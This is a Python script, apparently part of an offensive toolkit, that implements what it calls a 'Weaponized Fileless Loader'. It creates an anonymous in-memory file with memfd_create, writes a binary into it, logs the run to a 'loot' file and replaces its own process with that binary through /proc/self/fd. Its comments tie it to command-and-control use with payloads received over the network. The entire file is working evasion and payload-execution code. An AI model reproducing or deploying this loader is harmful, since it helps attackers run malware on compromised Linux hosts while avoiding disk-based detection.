import os
import sys
import ctypes
import subprocess

# Define the memfd_create syscall number (Linux x86_64: 319)
SYS_memfd_create = 319
MFD_CLOEXEC = 0x0001

def execute_fileless(binary_data, args=[]):
    """
    Weaponized Fileless Loader: Creates a RAM-only file descriptor, 
    populates it with binary data, and executes it via fexecve.
    """
    if not binary_data:
        print("[-] No binary data provided for execution.")
        return

    try:
        # 1. Access the C library
        libc = ctypes.CDLL("libc.so.6")

        # 2. Create the anonymous memory file
        # name: "chimera_vmem", flags: MFD_CLOEXEC
        fd = libc.syscall(SYS_memfd_create, b"chimera_vmem", MFD_CLOEXEC)
        
        if fd < 0:
            print("[-] memfd_create failed.")
            return

        print(f"[*] Memory file created at FD: {fd}")

        # 3. Write the payload into the file descriptor
        os.write(fd, binary_data)

        # 4. Execute the memory-backed file
        # We use /proc/self/fd/<fd> to point the kernel to our RAM file
        exec_path = f"/proc/self/fd/{fd}"
        
        print(f"[!!!] Launching Fileless Payload: {exec_path}")
        
        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: FILELESS_EXEC | FD: {fd} | Size: {len(binary_data)} bytes\n")

        # Use os.execv to replace the current process with the memory-only binary
        # This is the 'Ghost' transition—the Python process dies, the binary lives in RAM.
        os.execv(exec_path, [exec_path] + args)

    except Exception as e:
        print(f"[-] Fileless Execution Fault: {e}")

if __name__ == "__main__":
    # Example usage: Read a local binary and run it filelessly
    # In a real C2 scenario, binary_data would come from a network socket.
    if len(sys.argv) < 2:
        print("Usage: 168_mem_ghost <path_to_binary_to_ghost>")
        sys.exit(1)

    target_bin = sys.argv[1]
    if os.path.exists(target_bin):
        with open(target_bin, "rb") as f:
            data = f.read()
        execute_fileless(data, sys.argv[2:])
